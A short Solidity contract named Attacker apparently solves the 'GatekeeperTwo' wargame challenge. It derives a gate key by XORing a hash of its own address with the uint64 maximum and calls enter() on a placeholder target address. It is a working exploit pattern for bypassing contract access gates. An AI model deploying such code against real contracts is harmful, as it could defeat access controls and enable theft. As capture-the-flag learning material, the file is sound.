// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    constructor() {
        address gateContract = <address to Attack>
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max, "gate3");
        // uint64.max = 11... 64 times.
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 b = type(uint64).max;
        bytes8 c = bytes8(a ^ b);
        require(GatekeeperTwo(gateContract).enter(c), "Failed");
    }
}
